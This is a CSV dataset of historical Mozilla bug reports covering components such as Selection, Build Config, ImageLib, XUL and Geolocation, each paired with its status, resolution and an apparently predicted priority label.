Issue_id,Component,Title,Description,Status,Resolution,Text,Predicted_Priority
10331,Selection,Selecting text across lines with varying character spacing styles doesnt track cursor,Begin selecting from the middle of a line in the last paragraph on the page.; Attempt to extend the selection to near the beginning of the first line.  The; selected text doesnt track the cursor.,VERIFIED,FIXED,[TITLE] Title: Selecting text across lines with varying character spacing styles doesnt track cursor | [DESC] Description: Begin selecting from the middle of a line in the last paragraph on the page.; Attempt to extend the selection to near the beginning of the first line.  The; selected text doesnt track the cursor. | [META] Component: Selection | [META] Status: VERIFIED | [META] Resolution: FIXED,2
17640,Build Config,Race creating JAR files in JarMaker.py with highly-parallel builds,utils.lockFile doesnt always lock the file: O_EXCL seems to only take effect as long as youre holding the file descriptor open.; ; This puts a lie to the expected meaning of O_EXCL; but I dont care. It works.; ; I think this should block 1.9.1 because with highly parallel builds its not hard to end up with JAR files which are incomplete because multiple JarMakers are trying to write at the same time.,RESOLVED,FIXED,[TITLE] Title: Race creating JAR files in JarMaker.py with highly-parallel builds | [DESC] Description: utils.lockFile doesnt always lock the file: O_EXCL seems to only take effect as long as youre holding the file descriptor open.; ; This puts a lie to the expected meaning of O_EXCL; but I dont care. It works.; ; I think this should block 1.9.1 because with highly parallel builds its not hard to end up with JAR files which are incomplete because multiple JarMakers are trying to write at the same time. | [META] Component: Build Config | [META] Status: RESOLVED | [META] Resolution: FIXED,1
15848,DOM: Core & HTML,[FIXr]A number of URL properties of HTML elements are not resolved (e.g. cite of ins),User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3; Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3; ; Related URLs are not resolved to full URL for a number of properties included in; DOM HTML. These include:; - cite of ins/del;; - action of form;; - src of input; and; - useMap of a number of elements like image and object.; ; See also http://en.wikipedia.org/wiki/Comparison_of_layout_engines_%28DOM%29 for; a complete list of such attributes.; ; Reproducible: Always; ; Steps to Reproduce:; 1. Get the property value of such attribute; ; Actual Results:  ; Same as that returned from getAttribute().; ; Expected Results:  ; Should be treated as URL; e.g. a/b/c -> http://localhost/a/b/c,RESOLVED,FIXED,[TITLE] Title: [FIXr]A number of URL properties of HTML elements are not resolved (e.g. cite of ins) | [DESC] Description: User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3; Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3; ; Related URLs are not resolved to full URL for a number of properties included in; DOM HTML. These include:; - cite of ins/del;; - action of form;; - src of input; and; - useMap of a number of elements like image and object.; ; See also http://en.wikipedia.org/wiki/Comparison_of_layout_engines_%28DOM%29 for; a complete list of such attributes.; ; Reproducible: Always; ; Steps to Reproduce:; 1. Get the property value of such attribute; ; Actual Results:  ; Same as that returned from getAttribute().; ; Expected Results:  ; Should be treated as URL; e.g. a/b/c -> http://localhost/a/b/c | [META] Component: DOM: Core & HTML | [META] Status: RESOLVED | [META] Resolution: FIXED,0
17673,Document Navigation,shentry -> docviewer -> presshell -> mSelection link leads to need for multiple cycles of cycle collection,When I load google maps and then close the tab; it takes two cycles for things to be cycle collected.  At least one of the reasons for this (and theres a pretty decent chance its the only one) is the link from the pres shell to its mSelection.; ; In particular; my steps to reproduce; on a Linux mozilla-central DEBUG_CC build with some extra DEBUG_CC patches from my patch queue; are:;  1. start firefox;  2. press Ctrl+L to focus the URL bar;  3. type maps.google.com and hit enter;  4. Hit Ctrl+T to open a new tab;  5. close the google maps tab by clicking on its [X] with the mouse;  6. wait for the next cycle collection (and its DEBUG_CC output); ; In that DEBUG_CC output; I see a bunch of warnings that suggest that things arent being collected because of traversal deficiencies.  (My local DEBUG_CC patches make these warnings a little better.)  In particular; one of the warnings is:; ; nsCycleCollector: nsFrameSelection 0x3446140 in component 28104;   which was reference counted during the root/unlink/unroot phase of the;   last collection was not collected due to failure to unlink (see other;   warnings) or deficiency in traverse that causes cycles referenced only;   from other cycles to require multiple rounds of cycle collection in which;   this object was likely the reachable object;   An object expected to be garbage could be reached from it by the path:;     nsFrameSelection 0x3446140;         via mDomSelections[i];     nsTypedSelection 0x34462a0;         via mAnchorFocusRange;     nsRange 0x35ac5b0;         via mRoot;     nsDocument 0x3431da0; ; I used nsTraceRefcnt to get a log of all AddRef/Release calls on nsFrameSelection to find who was responsible for that Release during the root/unlink/unroot phase of the cycle collection.  Ill attach the stack; it shows that this object is the pres shells mSelection.,RESOLVED,FIXED,[TITLE] Title: shentry -> docviewer -> presshell -> mSelection link leads to need for multiple cycles of cycle collection | [DESC] Description: When I load google maps and then close the tab; it takes two cycles for things to be cycle collected.  At least one of the reasons for this (and theres a pretty decent chance its the only one) is the link from the pres shell to its mSelection.; ; In particular; my steps to reproduce; on a Linux mozilla-central DEBUG_CC build with some extra DEBUG_CC patches from my patch queue; are:;  1. start firefox;  2. press Ctrl+L to focus the URL bar;  3. type maps.google.com and hit enter;  4. Hit Ctrl+T to open a new tab;  5. close the google maps tab by clicking on its [X] with the mouse;  6. wait for the next cycle collection (and its DEBUG_CC output); ; In that DEBUG_CC output; I see a bunch of warnings that suggest that things arent being collected because of traversal deficiencies.  (My local DEBUG_CC patches make these warnings a little better.)  In particular; one of the warnings is:; ; nsCycleCollector: nsFrameSelection 0x3446140 in component 28104;   which was reference counted during the root/unlink/unroot phase of the;   last collection was not collected due to failure to unlink (see other;   warnings) or deficiency in traverse that causes cycles referenced only;   from other cycles to require multiple rounds of cycle collection in which;   this object was likely the reachable object;   An object expected to be garbage could be reached from it by the path:;     nsFrameSelection 0x3446140;         via mDomSelections[i];     nsTypedSelection 0x34462a0;         via mAnchorFocusRange;     nsRange 0x35ac5b0;         via mRoot;     nsDocument 0x3431da0; ; I used nsTraceRefcnt to get a log of all AddRef/Release calls on nsFrameSelection to find who was responsible for that Release during the root/unlink/unroot phase of the cycle collection.  Ill attach the stack; it shows that this object is the pres shells mSelection. | [META] Component: Document Navigation | [META] Status: RESOLVED | [META] Resolution: FIXED,1
11833,ImageLib,Crash with scaled-down PNG with 8-bit alpha mask,When displaying a page containing a PNG which has been scaled; the application; heap gets trashed (like we wrote off the end of a buffer somewhere). This does; not happen when the same image is not scaled.; ; This problem occurs on http://jazz/users/pnunn/publish/pngpix/aaaa3.html;; even when the file is pared down to contain just; ; <html>; <body bgcolor=#ffff00 >; <img src=allgrad1.png width=10>; </body>; </html>,VERIFIED,FIXED,[TITLE] Title: Crash with scaled-down PNG with 8-bit alpha mask | [DESC] Description: When displaying a page containing a PNG which has been scaled; the application; heap gets trashed (like we wrote off the end of a buffer somewhere). This does; not happen when the same image is not scaled.; ; This problem occurs on http://jazz/users/pnunn/publish/pngpix/aaaa3.html;; even when the file is pared down to contain just; ; <html>; <body bgcolor=#ffff00 >; <img src=allgrad1.png width=10>; </body>; </html> | [META] Component: ImageLib | [META] Status: VERIFIED | [META] Resolution: FIXED,1
13219,XPCOM,Missing symbols in libxpcom.so (IRIX/gcc),Building mozilla with gcc on IRIX results in missing symbols ; nsXPTCStubBase::Stub130 in libxpcom.so; ; Looking in xpcom/reflect/xptcall/src/md/unix/; nm indicates that the symbols ; are missing because they should be nsXPTCStubBase::Stub130(void) ; ; And xpcom/reflect/xptcall/src/xptcall.o seems to be were the incorrectly named ; symbols come from.; ; ---; % ./mozilla; ...; 12643702:./mozilla-bin: rld: Error: unresolvable symbol in ./libxpcom.so: ; Stub120__14nsXPTCStubBase; 12643702:./mozilla-bin: rld: Error: unresolvable symbol in ./libxpcom.so: ; Stub20__14nsXPTCStubBase; ...; ---; % nm xpcom/reflect/xptcall/src/md/unix/libxptcmd.a | grep Stub130; [4]	|      4064|      32|FUNC |GLOB |DEFAULT  |4      ; |Stub130__14nsXPTCStubBaseGv; ---; % nm xpcom/build/libxpcom.so | grep Stub130; [509]	|1609924392|      32|FUNC |GLOB |DEFAULT  ; |MIPS_TEXT|Stub130__14nsXPTCStubBaseGv; [902]	|         0|       0|FUNC |GLOB |DEFAULT  |UNDEF  ; |Stub130__14nsXPTCStubBase; ---; % nm xpcom/reflect/xptcall/src/xptcall.o | grep Stub130; [15]    |         0|       0|FUNC |GLOB |DEFAULT  |UNDEF  ; |Stub130__14nsXPTCStubBase,RESOLVED,FIXED,[TITLE] Title: Missing symbols in libxpcom.so (IRIX/gcc) | [DESC] Description: Building mozilla with gcc on IRIX results in missing symbols ; nsXPTCStubBase::Stub130 in libxpcom.so; ; Looking in xpcom/reflect/xptcall/src/md/unix/; nm indicates that the symbols ; are missing because they should be nsXPTCStubBase::Stub130(void) ; ; And xpcom/reflect/xptcall/src/xptcall.o seems to be were the incorrectly named ; symbols come from.; ; ---; % ./mozilla; ...; 12643702:./mozilla-bin: rld: Error: unresolvable symbol in ./libxpcom.so: ; Stub120__14nsXPTCStubBase; 12643702:./mozilla-bin: rld: Error: unresolvable symbol in ./libxpcom.so: ; Stub20__14nsXPTCStubBase; ...; ---; % nm xpcom/reflect/xptcall/src/md/unix/libxptcmd.a | grep Stub130; [4]	|      4064|      32|FUNC |GLOB |DEFAULT  |4      ; |Stub130__14nsXPTCStubBaseGv; ---; % nm xpcom/build/libxpcom.so | grep Stub130; [509]	|1609924392|      32|FUNC |GLOB |DEFAULT  ; |MIPS_TEXT|Stub130__14nsXPTCStubBaseGv; [902]	|         0|       0|FUNC |GLOB |DEFAULT  |UNDEF  ; |Stub130__14nsXPTCStubBase; ---; % nm xpcom/reflect/xptcall/src/xptcall.o | grep Stub130; [15]    |         0|       0|FUNC |GLOB |DEFAULT  |UNDEF  ; |Stub130__14nsXPTCStubBase | [META] Component: XPCOM | [META] Status: RESOLVED | [META] Resolution: FIXED,2
12588,XUL,Up/down arrow should switch between radiobuttons in <radiogroup>,Build ID: just pulled; ; You can currently tab to a radiobutton in a radiogroup; but not into other ; radiobuttons in the same group -- another tab sets focus to the next widget ; outside of the radiogroup.  Thus; the up and down arrows should allow you to ; switch (set focus) between the radio buttons in a group.,VERIFIED,FIXED,[TITLE] Title: Up/down arrow should switch between radiobuttons in <radiogroup> | [DESC] Description: Build ID: just pulled; ; You can currently tab to a radiobutton in a radiogroup; but not into other ; radiobuttons in the same group -- another tab sets focus to the next widget ; outside of the radiogroup.  Thus; the up and down arrows should allow you to ; switch (set focus) between the radio buttons in a group. | [META] Component: XUL | [META] Status: VERIFIED | [META] Resolution: FIXED,3
11279,Layout,{css1} Floating images overlap when viewport is narrow,See test page.; ; The page contains two images floated using HTMLs ALIGN attribute; which are; followed by some text in a CENTER element. This is first done in a table;; and then an identical version is repeated outside the table.; ;  What Happens.; ;      Images are drawn fine; but HRs and text go all over the place.;      This is not fixed by a reflow.; ;  What Should Happen.; ;      Text should go between the images. Bottom HR should go;      between the images too. There should never be any overlap.; ; In the table; the text overlaps the left image. Out of the table; the text; overlaps the right image. I am not sure why.,VERIFIED,WORKSFORME,[TITLE] Title: {css1} Floating images overlap when viewport is narrow | [DESC] Description: See test page.; ; The page contains two images floated using HTMLs ALIGN attribute; which are; followed by some text in a CENTER element. This is first done in a table;; and then an identical version is repeated outside the table.; ;  What Happens.; ;      Images are drawn fine; but HRs and text go all over the place.;      This is not fixed by a reflow.; ;  What Should Happen.; ;      Text should go between the images. Bottom HR should go;      between the images too. There should never be any overlap.; ; In the table; the text overlaps the left image. Out of the table; the text; overlaps the right image. I am not sure why. | [META] Component: Layout | [META] Status: VERIFIED | [META] Resolution: WORKSFORME,2
11139,Tracking,Buttons display black marks on 8-bit displays,Under Windows 98 with 256-color (8-bit) displays; the buttons displayed in; apprunner dont look good. The Instant Message; WebMail etc. buttons look fine;; but the Back; Forward etc. buttons are speckled with black marks (looks like it; might be bad dithering?). I suppose wed better design these buttons on a 8-bit; display first & then hope they look fine on more-color displays.,VERIFIED,DUPLICATE,[TITLE] Title: Buttons display black marks on 8-bit displays | [DESC] Description: Under Windows 98 with 256-color (8-bit) displays; the buttons displayed in; apprunner dont look good. The Instant Message; WebMail etc. buttons look fine;; but the Back; Forward etc. buttons are speckled with black marks (looks like it; might be bad dithering?). I suppose wed better design these buttons on a 8-bit; display first & then hope they look fine on more-color displays. | [META] Component: Tracking | [META] Status: VERIFIED | [META] Resolution: DUPLICATE,2
13350,Security: UI,loading above secure url then using stop hangs browser.,enter above url. The browser tries to locate https://verisign.com (site is truly; at www.verisign.com). Hit the stop button. Browser hangs.; if using a non secure url; the hang doesnt occur.,VERIFIED,DUPLICATE,[TITLE] Title: loading above secure url then using stop hangs browser. | [DESC] Description: enter above url. The browser tries to locate https://verisign.com (site is truly; at www.verisign.com). Hit the stop button. Browser hangs.; if using a non secure url; the hang doesnt occur. | [META] Component: Security: UI | [META] Status: VERIFIED | [META] Resolution: DUPLICATE,1
12488,XUL,editor does not regain focus after dialog is dismissed.,windows 2000-08-23-06-m18; linux 2000-08-23-06-m18; ; cannot use tool bar functions; spell check (bug 49463) image; hline; table; ; link; anchor.  clicking on any of these elicits no activity.,VERIFIED,FIXED,[TITLE] Title: editor does not regain focus after dialog is dismissed. | [DESC] Description: windows 2000-08-23-06-m18; linux 2000-08-23-06-m18; ; cannot use tool bar functions; spell check (bug 49463) image; hline; table; ; link; anchor.  clicking on any of these elicits no activity. | [META] Component: XUL | [META] Status: VERIFIED | [META] Resolution: FIXED,2
17998,Geolocation,Geolocation Crashes Fennec,User-Agent:       Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 FirePHP/0.3; Build Identifier: 1.0b4; ; Attempting to get geolocation crashes Fennec.   Same site works fine w/Firefox Desktop.; ; Reproducible: Always; ; Steps to Reproduce:; 1.Browse to http://avwx.net; 2.Log-in.  Username: Mozilla  Password: Fennec; 3.Choose Find Nearby Airports from main menu.; 4.Click the Share button in response to avwx.net wants your location.; ; Actual Results:  ; Fennec Crashes; ; Expected Results:  ; Display the main menu with 3 nearby airports at the top of the menu.; ; MacOS Crash Report attached.,RESOLVED,FIXED,[TITLE] Title: Geolocation Crashes Fennec | [DESC] Description: User-Agent:       Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 FirePHP/0.3; Build Identifier: 1.0b4; ; Attempting to get geolocation crashes Fennec.   Same site works fine w/Firefox Desktop.; ; Reproducible: Always; ; Steps to Reproduce:; 1.Browse to http://avwx.net; 2.Log-in.  Username: Mozilla  Password: Fennec; 3.Choose Find Nearby Airports from main menu.; 4.Click the Share button in response to avwx.net wants your location.; ; Actual Results:  ; Fennec Crashes; ; Expected Results:  ; Display the main menu with 3 nearby airports at the top of the menu.; ; MacOS Crash Report attached. | [META] Component: Geolocation | [META] Status: RESOLVED | [META] Resolution: FIXED,1
13349,Security: UI,Edit Cipher button and SSL CipherSuite window not lockable,In the General Preference window under the Privacy and Security Category -> SSL;; the Edit Cipher button and Edit Cipher Window Elements are not lockable. ; According to eclient spec; all preferences in general pref area should be; lockable.  There is no way to lock down SSL2 and SSL3 Ciphersuites on the; browser.  This is a requirement for eclient.  eddyk already aware of this issue.,VERIFIED,FIXED,[TITLE] Title: Edit Cipher button and SSL CipherSuite window not lockable | [DESC] Description: In the General Preference window under the Privacy and Security Category -> SSL;; the Edit Cipher button and Edit Cipher Window Elements are not lockable. ; According to eclient spec; all preferences in general pref area should be; lockable.  There is no way to lock down SSL2 and SSL3 Ciphersuites on the; browser.  This is a requirement for eclient.  eddyk already aware of this issue. | [META] Component: Security: UI | [META] Status: VERIFIED | [META] Resolution: FIXED,1
10524,Layout: Tables,table lays out wrong until reflow,The table at the above URL when viewed in Communicator 4.5 has 3 columns.; However; when its seen with viewer it has only two columns - until the window; is resized; triggering a reflow. Then it lays out properly.,VERIFIED,DUPLICATE,[TITLE] Title: table lays out wrong until reflow | [DESC] Description: The table at the above URL when viewed in Communicator 4.5 has 3 columns.; However; when its seen with viewer it has only two columns - until the window; is resized; triggering a reflow. Then it lays out properly. | [META] Component: Layout: Tables | [META] Status: VERIFIED | [META] Resolution: DUPLICATE,2
14263,HTML: Form Submission,High ASCII data is being cut off at certain characters during form submission,In textarea or input type text if the value contains some of these entities: &; ocirc; or & otilde; .... mozilla (tested under win2k; under linux worked) would; not send the data; it breaks before these chars. I make a test page; so you; check it. This is very important; cause who use mozilla and this chars under; windows; can not send the text they want. It can be fixed from html or it is a; real mozilla bug?,VERIFIED,FIXED,[TITLE] Title: High ASCII data is being cut off at certain characters during form submission | [DESC] Description: In textarea or input type text if the value contains some of these entities: &; ocirc; or & otilde; .... mozilla (tested under win2k; under linux worked) would; not send the data; it breaks before these chars. I make a test page; so you; check it. This is very important; cause who use mozilla and this chars under; windows; can not send the text they want. It can be fixed from html or it is a; real mozilla bug? | [META] Component: HTML: Form Submission | [META] Status: VERIFIED | [META] Resolution: FIXED,2
